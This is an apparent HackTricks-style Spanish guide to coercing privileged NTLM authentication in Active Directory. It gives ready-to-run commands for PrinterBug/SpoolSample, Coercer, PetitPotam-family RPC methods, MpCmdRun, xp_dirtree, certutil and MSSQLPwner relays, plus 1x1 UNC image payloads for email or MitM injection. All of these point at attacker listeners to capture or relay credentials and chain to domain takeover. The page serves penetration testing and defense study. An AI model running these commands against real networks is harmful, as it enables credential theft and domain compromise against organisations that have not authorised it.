# Forzar la autenticación privilegiada NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) es una **colección** de **remote authentication triggers** programados en C# usando el compilador MIDL para evitar dependencias de terceros.

## Abuso del servicio Spooler

Si el servicio _**Print Spooler**_ está **habilitado,** puedes usar algunas credenciales de AD ya conocidas para **solicitar** al servidor de impresión del Domain Controller una **actualización** sobre nuevos trabajos de impresión y simplemente indicarle que **envíe la notificación a algún sistema**.\
Ten en cuenta que, cuando la impresora envía la notificación a sistemas arbitrarios, necesita **autenticarse contra** ese **sistema**. Por lo tanto, un atacante puede hacer que el servicio _**Print Spooler**_ se autentique contra un sistema arbitrario, y el servicio **usará la cuenta del equipo** en esta autenticación.

Internamente, el primitive clásico **PrinterBug** abusa de **`RpcRemoteFindFirstPrinterChangeNotificationEx`** mediante **`\\PIPE\\spoolss`**. Primero, el atacante abre un handle de impresora/servidor y después proporciona un nombre de cliente falso en `pszLocalMachine`, por lo que el spooler objetivo crea un canal de notificación **de vuelta al host controlado por el atacante**. Por esto, el efecto es una **coerción de autenticación saliente** en lugar de una ejecución directa de código.<sup>[[2]](#references)</sup>\
Si buscas **RCE/LPE** en el propio spooler, consulta [PrintNightmare](printnightmare.md). Esta página se centra en la **coerción y el relay**.

### Encontrar servidores Windows en el dominio

Usa PowerShell para listar los hosts Windows. Los servidores suelen ser los objetivos prioritarios, así que céntrate primero en ellos:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Detectando servicios Spooler escuchando

Usando una versión ligeramente modificada de [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) de @mysmartlogin (Vincent Le Toux), comprueba si el Spooler Service está escuchando:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
También puedes usar `rpcdump.py` en Linux y buscar el protocolo **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
O prueba rápidamente los hosts desde Linux con **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Si quieres **enumerar las superficies de coerción** en lugar de comprobar únicamente si existe el endpoint del spooler, usa el **modo de escaneo de Coercer**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Esto es útil porque ver el endpoint en EPM solo te indica que la interfaz RPC de impresión está registrada. **No** garantiza que todos los métodos de coerción sean accesibles con tus privilegios actuales ni que el host genere un flujo de autenticación utilizable.

### Solicitar al servicio que se autentique contra un host arbitrario

Puedes compilar [SpoolSample desde aquí](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
o usa [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) si estás en Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Con **Coercer**, puedes dirigirte directamente a las interfaces del spooler y evitar adivinar qué método RPC está expuesto:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Forzando HTTP en lugar de SMB con WebClient

El PrinterBug clásico normalmente obtiene una autenticación **SMB** hacia `\\attacker\share`, que sigue siendo útil para **capture**, **relay a objetivos HTTP** o **relay cuando no hay SMB signing**.\
Sin embargo, en los entornos modernos, el **relay de SMB a SMB** suele estar bloqueado por **SMB signing**, por lo que los operadores suelen preferir forzar la autenticación **HTTP/WebDAV**.

Si el objetivo tiene el servicio **WebClient** en ejecución, el listener puede especificarse de una forma que haga que Windows use **WebDAV sobre HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Esto resulta especialmente útil al encadenarlo con **`ntlmrelayx --adcs`** u otros objetivos de HTTP relay, ya que evita depender de la posibilidad de realizar SMB relay en la conexión coaccionada. La salvedad importante es que **WebClient debe estar ejecutándose** en la víctima para que funcione la variante HTTP/WebDAV.

### Combinación con Unconstrained Delegation

Si un atacante ha comprometido un equipo configurado para [Unconstrained Delegation](unconstrained-delegation.md), puede **coaccionar a la impresora para que se autentique en ese equipo**. El **TGT** de la cuenta de equipo de la impresora se almacena en caché en memoria en el host con unconstrained delegation, donde el atacante puede recuperarlo y reutilizarlo con [Pass the Ticket](pass-the-ticket.md).

## Autenticación forzada mediante RPC

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Matriz de coerción mediante rutas UNC de RPC (interfaces/opnums que activan autenticación saliente)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: interfaz de impresión asíncrona en el mismo pipe del spooler; usa Coercer para enumerar los métodos accesibles en un host determinado<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (también mediante \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums comúnmente abusados: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Nota: estos métodos aceptan parámetros que pueden contener una ruta UNC (por ejemplo, `\\attacker\share`). Al procesarlos, Windows se autenticará (en el contexto de máquina/usuario) en esa UNC, lo que permite capturar o realizar relay de NetNTLM.\
Para el abuso del spooler, **MS-RPRN opnum 65** sigue siendo la primitive más común y mejor documentada, porque la especificación del protocolo establece explícitamente que el servidor crea un canal de notificación hacia el cliente especificado por `pszLocalMachine`.<sup>[[2]](#references)</sup>

### Coerción de MS-EVEN: ElfrOpenBELW (opnum 9)
- Interface: MS-EVEN mediante \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: el objetivo intenta abrir la ruta de backup del log proporcionada y se autentica en la UNC controlada por el atacante.<sup>[[1]](#references)</sup>
- Practical use: coaccionar activos Tier 0 (DC/RODC/Citrix/etc.) para que emitan NetNTLM y, posteriormente, realizar relay hacia endpoints de AD CS (escenarios ESC8/ESC11) u otros servicios privilegiados.<sup>[[1]](#references)</sup>

## PrivExchange

El ataque `PrivExchange` es el resultado de un fallo encontrado en la **funcionalidad `PushSubscription` de Exchange Server**. Esta funcionalidad permite que cualquier usuario del dominio con un buzón fuerce al servidor Exchange a autenticarse en cualquier host proporcionado por el cliente mediante HTTP.

De forma predeterminada, el **servicio de Exchange se ejecuta como SYSTEM** y recibe privilegios excesivos (concretamente, tiene **privilegios WriteDacl en el dominio antes de la Cumulative Update de 2019**). Este fallo puede explotarse para permitir el **relaying de información hacia LDAP y, posteriormente, extraer la base de datos NTDS del dominio**. Cuando no es posible realizar relay hacia LDAP, este fallo aún puede utilizarse para realizar relay y autenticarse en otros hosts del dominio. La explotación exitosa de este ataque proporciona acceso inmediato a Domain Admin con cualquier cuenta de usuario autenticada del dominio.

## Dentro de Windows

Si ya estás dentro de la máquina Windows, puedes forzar a Windows a conectarse a un servidor utilizando cuentas privilegiadas con:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
O usa esta otra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Es posible usar el lolbin certutil.exe (binario firmado por Microsoft) para forzar la autenticación NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### A través del correo electrónico

Si conoces la **dirección de correo electrónico** del usuario que inicia sesión en una máquina que quieres comprometer, simplemente podrías enviarle un **correo electrónico con una imagen de 1x1** como
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Cuando la víctima lo abre, Windows intenta autenticarse.

### MitM

Si puedes realizar un ataque MitM e inyectar HTML en una página que la víctima esté viendo, intenta inyectar una imagen como:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Otras formas de forzar y hacer phishing para obtener autenticación NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Si puedes capturar [desafíos NTLMv1, lee aquí cómo crackearlos](../ntlm/index.html#ntlmv1-attack).\
_Recuerda que, para crackear NTLMv1, debes establecer el desafío de Responder en "1122334455667788"_

## References

- [1] [Unit 42 – La coerción de autenticación sigue evolucionando](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Protocolo de remoting de EventLog](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
{{#include ../../banners/hacktricks-training.md}}
